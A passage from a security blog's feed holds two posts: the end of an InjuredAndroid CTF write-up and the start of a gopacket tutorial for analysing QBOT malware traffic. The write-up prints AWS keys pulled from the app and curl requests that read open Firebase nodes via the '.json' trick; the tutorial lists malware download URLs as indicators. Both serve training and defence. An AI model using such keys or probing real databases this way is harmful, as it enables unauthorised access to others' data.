    d h <span class="token operator">=</span> d2<span class="token punctuation">.</span><span class="token function">h</span><span class="token punctuation">(</span><span class="token string">"/aws"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token string">"database.child(\"/aws\")"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>v <span class="token operator">=</span> h<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The activity initializes firebase instance and fetches some information from the AWS child node in the firebase storage model. First check if the model is vulnerable to <code>.json</code> trick of firebase read write vulnerability.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:ret2csu$ <span class="token function">curl</span> https://injuredandroid.firebaseio.com/aws.json
<span class="token string">"C10ud_S3cur1ty_lol"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>Next is analyzing <code>onClick</code> method of the activity. This method responds to events of an application clicked and are defined in the Activity.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">FlagEightLoginActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">H</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>view <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Snackbar</span> <span class="token class-name">X</span> <span class="token operator">=</span> <span class="token class-name">Snackbar<span class="token punctuation">.</span>X</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> <span class="token string">"AWS CLI."</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">X<span class="token punctuation">.</span>Y</span><span class="token punctuation">(</span><span class="token string">"Action"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">X<span class="token punctuation">.</span>N</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">FlagEightLoginActivity</span> flagEightLoginActivity <span class="token operator">=</span> <span class="token class-name">FlagEightLoginActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token namespace">flagEightLoginActivity<span class="token punctuation">.</span></span>I</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">flagEightLoginActivity<span class="token punctuation">.</span></span>H</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">k</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">throw</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">FlagEightLoginActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">H</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>view <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Snackbar</span> X2 <span class="token operator">=</span> <span class="token class-name">Snackbar<span class="token punctuation">.</span>X</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> <span class="token string">"AWS profiles and credentials."</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">X2<span class="token punctuation">.</span>Y</span><span class="token punctuation">(</span><span class="token string">"Action"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">X2<span class="token punctuation">.</span>N</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">FlagEightLoginActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">k</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">throw</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From <strong>HINTS</strong> provided in the Activity, we need to understand the “AWS profiles and credentials” usage in order to subvert the intended behavior.</p>
<p><strong>what are the AWS profile stored?</strong></p>
<p>Most of the strings are stored in <strong>strings.xml</strong> in the resources directory which are referenced throughout the application. In <code>strings.xml</code> file we have two interesting strings.</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>AWS_ID<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>AKIAZ36DGKTUIOLDOBN6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>AWS_SECRET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>KKT4xQAQ5cKzJOsoSImlNFFTRxjYkoc71vuRP48S<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>AWS CLI</strong> is a unified tool to manage your AWS services, it enables one to configure AWS services through command line and automate them through scripts.<br>To install <strong>aws-cli</strong> on your linux machine type the following in your terminal.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -m pip <span class="token function">install</span> --user awscli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>For adding the aws profile, use the following command in terminal as shown below.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:~$ aws configure
AWS Access Key ID <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: AKIAZ36DGKTUIOLDOBN6
AWS Secret Access Key <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: KKT4xQAQ5cKzJOsoSImlNFFTRxjYkoc71vuRP48S<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="Flag9-FireBase"><a href="#Flag9-FireBase" class="headerlink" title="Flag9- FireBase"></a>Flag9- FireBase</h2><h3 id="What-is-firebase"><a href="#What-is-firebase" class="headerlink" title="What is firebase?"></a>What is firebase?</h3><p>Google firebase is a mobile and web application development platform that provides a real-time database that continuously syncs data between cloud and user’s mobile devices. Firebase databases are accessible via an API and that if developers have not correctly secured their firebase database, a simple request can retrieve it&#96;s entire content.</p>
<p>We need to analyze the <code>FlagNineFirebaseActivity</code> in order to understand how read and write rules are implemented in the application.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">goToFlagNineFirebaseActivity</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token function">startActivity</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token class-name">FlagNineFirebaseActivity</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">FlagNineFirebaseActivity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"ZmxhZ3Mv"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//  flags/</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>v <span class="token operator">=</span> decode<span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>decode<span class="token punctuation">,</span> <span class="token string">"decodedDirectory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Charset</span> charset <span class="token operator">=</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span>UTF_8<span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>charset<span class="token punctuation">,</span> <span class="token string">"StandardCharsets.UTF_8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>w <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>decode<span class="token punctuation">,</span> charset<span class="token punctuation">)</span><span class="token punctuation">;</span>
    f b2 <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span> <span class="token string">"FirebaseDatabase.getInstance()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d d2 <span class="token operator">=</span> b2<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>d2<span class="token punctuation">,</span> <span class="token string">"FirebaseDatabase.getInstance().reference"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> d2<span class="token punctuation">;</span>
    d h <span class="token operator">=</span> d2<span class="token punctuation">.</span><span class="token function">h</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token string">"database.child(refDirectory)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> h<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Decode BASE64 encoded strings in order to understand strings stored in the <code>decode</code> variable.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:~$ <span class="token builtin class-name">echo</span> <span class="token string">"ZmxhZ3Mv"</span> <span class="token operator">|</span> base64 -d
            flags/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>From the above decoded string,we are getting data from firebase storage, in the <strong>flags</strong> node.</p>
<p>Looking at the decompiled below, it gives us an hint of solving the problem <strong>“Use the .json trick database url”</strong> .</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> str<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">FlagNineFirebaseActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">H</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>view <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                str <span class="token operator">=</span> <span class="token string">"Use the .json trick with database url"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">k</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">throw</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">FlagNineFirebaseActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">H</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>view <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                str <span class="token operator">=</span> <span class="token string">"Filenames."</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">k</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">throw</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Firebase-Realtime-Rules"><a href="#Firebase-Realtime-Rules" class="headerlink" title="Firebase Realtime Rules"></a>Firebase Realtime Rules</h3><p><code>Realtime database</code> stores data as one large JSON tree and synchronized every time a new device is connected.The data received or stored in the database is determined by the security rules of <code>read</code> and <code>write</code>.</p>
<p>Firebase allows read and write rules to the database to be set to true or false. When <strong>.read</strong> is set to true means describes if and data is allowed to be read by users and <strong>.write</strong> describes if and when data is allowed to be written.<br>Example of a firebase rule where read and write are allowed.</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"rules"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">".read"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token property">".write"</span><span class="token operator">:</span> <span class="token boolean">true</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>When read and write rules are enabled means that everyone with access to the application can read and write unauthorized data to the database.</p>
<p>The firebase database url is defined in <strong>strings.xml</strong> file in the resource section.</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>firebase_database_url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>https://injuredandroid.firebaseio.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>The firebase node defined in our instance is <strong>flags</strong> node, to check if the endpoint node is vulnerable we append a <strong>.json</strong> at the end of the url node as shown in the image below.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:injured$ <span class="token function">curl</span> https://injuredandroid.firebaseio.com/flags/.json
<span class="token string">"[nine!_flag]"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>If the url returns data, means our endpoint is vulnerable. From the above output we were able to successfully solve the challenge.</p>
<h3 id="Securing-Firebase"><a href="#Securing-Firebase" class="headerlink" title="Securing Firebase"></a>Securing Firebase</h3><p>One can secure Firebase database by only allowing users of application to have only read permissions to a certain tree node instead of allowing read to the root node in the application. This means the applications can not read data from the neighboring nodes.</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"rules"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"flag"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token property">".read"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
      <span class="token property">".write"</span><span class="token operator">:</span> <span class="token boolean">false</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <tags>
        <tag>android</tag>
        <tag>appsec</tag>
      </tags>
  </entry>
  <entry>
    <title>Gopackets library</title>
    <url>/2022/04/20/Gopackets/</url>
    <content><![CDATA[<p>This is an article of my adventures with golang <strong>gopacket</strong> library. As I was working on a personal project, I came across <a href="https://github.com/google/gopacket">gopacket</a> library which provides capabilities for decoding packets in Go. <span id="more"></span> The capabilities provided by the library motivated me to try malware traffic analysis with the library instead of using Wireshark. This article focuses on analyzing the <code>QKBOT</code> malware traffic .</p>
<h2 id="What-is-gopacket"><a href="#What-is-gopacket" class="headerlink" title="What is gopacket"></a>What is gopacket</h2><p>Gopacket is a library developed by google that provides capabilities for decoding packets in Go language, it enables one to decode the Layers structures of the packets, Network flows, create packets, e.t.c . Library can be used for various purposes ranging from:</p>
<ul>
<li>Networking tools by Network Administrators</li>
<li>Offensive tooling by RED teams i.e Packet Sniffers</li>
<li>Defensive analysis capabilities by Blue Teams i.e IP monitoring</li>
</ul>
<p>The ability to manually craft packets can enable one to test systems network connectivity( up or down),vulnerabilities on systems by replaying packets over network.</p>
<p>Below are scenarios where <strong>gopacket</strong> can be used by different users.</p>
<h2 id="Defensive-capabilities"><a href="#Defensive-capabilities" class="headerlink" title="Defensive capabilities"></a>Defensive capabilities</h2><p>To understand how gopacket can be used by defenders, we will analyze a packet of malware traffic from <a href="https://www.malware-traffic-analysis.net/2022/04/14/index.html">malware-traffic-analysis website</a>.</p>
<p>For this case I will use <a href="https://www.malware-traffic-analysis.net/2022/04/14/index.html">QBOT Pcap</a> provided in April 2022.</p>
<blockquote>
<p>Before starting analysis of malware of any software one needs to have a clear objective of what HE&#x2F;She wants to achieve. Our goal can be analyzing malware for various key words, IP addresses or any other IOCs.</p>
</blockquote>
<h3 id="1-keywords-Filtering"><a href="#1-keywords-Filtering" class="headerlink" title="1. keywords Filtering"></a>1. keywords Filtering</h3><p>First we can write a simple program to analyze our packets using keywords which can be contained in the Application layer of the TCP Model of our packets.</p>
<blockquote>
<p>The keywords can range from HTTP Methods, File extensions and Known domain names. The keywords can be <strong>“GET”</strong> http method, <strong>“.zip”</strong> or <strong>“.exe”</strong> to check the file names extensions.</p>
</blockquote>
<p>Example code of searching our packet using keyword values is shown below.</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
 <span class="token string">"fmt"</span>
 <span class="token string">"strings"</span>

 <span class="token string">"github.com/google/gopacket"</span>
 <span class="token string">"github.com/google/gopacket/pcap"</span>
<span class="token punctuation">)</span>

<span class="token comment">//declare variable to hold our pcap file</span>
<span class="token keyword">var</span> pcapFile <span class="token builtin">string</span> <span class="token operator">=</span><span class="token string">"cobalt-strike.pcap"</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">//read the packet file</span>
 handle<span class="token punctuation">,</span> err <span class="token operator">:=</span> pcap<span class="token punctuation">.</span><span class="token function">OpenOffline</span><span class="token punctuation">(</span>pcapFile<span class="token punctuation">)</span>
 <span class="token keyword">var</span> filter <span class="token builtin">string</span>  <span class="token operator">=</span> <span class="token string">"tcp"</span>
 err <span class="token operator">=</span> handle<span class="token punctuation">.</span><span class="token function">SetBPFFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span>
 <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
  <span class="token function">panic</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span>
 packetSource  <span class="token operator">:=</span> gopacket<span class="token punctuation">.</span><span class="token function">NewPacketSource</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> handle<span class="token punctuation">.</span><span class="token function">LinkType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token keyword">for</span> packet <span class="token operator">:=</span><span class="token keyword">range</span> packetSource<span class="token punctuation">.</span><span class="token function">Packets</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  app <span class="token operator">:=</span> packet<span class="token punctuation">.</span><span class="token function">ApplicationLayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">if</span> app <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span><span class="token function">Payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"zip"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span><span class="token function">Payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>For the above code we are doing Berkeley Filter of only TCP traffic.<br>It is possible to filter both <strong>Stream type</strong> and <strong>PORT</strong> using BPF.</p>
<p>The results from the code above are.</p>
<p><img data-src="/images/packets/packet_name-filter.png" alt="Filter GET HTTP Method"></p>
<p>From running the above code we are able to get file attachment name “<strong>iseerroaemtefspidnle.zip</strong>“ which is part of the artifacts of the malware provided.</p>
<p>The attachments files name are matched by the IOC provided</p>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">TRAFFIC TO DOWNLOAD THE INITIAL ZIP ARCHIVE:

<span class="token list punctuation">-</span> 208.91.198.131 port 443 - https://geobram.com/ist/iseerroaemtefspidnle
<span class="token list punctuation">-</span> 208.91.198.131 port 443 - https://geobram.com/ist/NO_2950435796.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>The “<em>GET</em>“ method is used for getting an available resource, therefore meaning the zip file is downloaded to the victim’s machine.</p>
<h3 id="2-Packet-Network-Flows"><a href="#2-Packet-Network-Flows" class="headerlink" title="2. Packet Network Flows"></a>2. Packet Network Flows</h3><p><strong>gopacket</strong> enables one to follow the network flow in certain port or even stream. This enables one to track network activity of a given IP address. This is very useful when there is a spike of network activity in a given port or range of ports but source is not known.</p>
<p>Example code used for Filtering the C2 traffic flow for a given port is as shown in the code snippet below.</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
 <span class="token string">"fmt"</span>

 <span class="token string">"github.com/google/gopacket"</span>
 <span class="token string">"github.com/google/gopacket/layers"</span>
 <span class="token string">"github.com/google/gopacket/pcap"</span>
<span class="token punctuation">)</span>

<span class="token comment">//declare variable to hold our pcap file</span>
<span class="token keyword">var</span> pcapFile <span class="token builtin">string</span> <span class="token operator">=</span><span class="token string">"cobalt-strike.pcap"</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">//read the packet file</span>
 handle<span class="token punctuation">,</span> err <span class="token operator">:=</span> pcap<span class="token punctuation">.</span><span class="token function">OpenOffline</span><span class="token punctuation">(</span>pcapFile<span class="token punctuation">)</span>
 <span class="token keyword">var</span> filter <span class="token builtin">string</span>  <span class="token operator">=</span> <span class="token string">"tcp and port 65400"</span>
 err <span class="token operator">=</span> handle<span class="token punctuation">.</span><span class="token function">SetBPFFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span>
 <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
  <span class="token function">panic</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span>
 packetSource  <span class="token operator">:=</span> gopacket<span class="token punctuation">.</span><span class="token function">NewPacketSource</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> handle<span class="token punctuation">.</span><span class="token function">LinkType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token keyword">for</span> packet <span class="token operator">:=</span><span class="token keyword">range</span> packetSource<span class="token punctuation">.</span><span class="token function">Packets</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  tcp <span class="token operator">:=</span> packet<span class="token punctuation">.</span><span class="token function">TransportLayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>layers<span class="token punctuation">.</span>TCP<span class="token punctuation">)</span>
  <span class="token keyword">if</span> tcp <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
   fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>packet<span class="token punctuation">.</span><span class="token function">NetworkLayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">NetworkFlow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">return</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

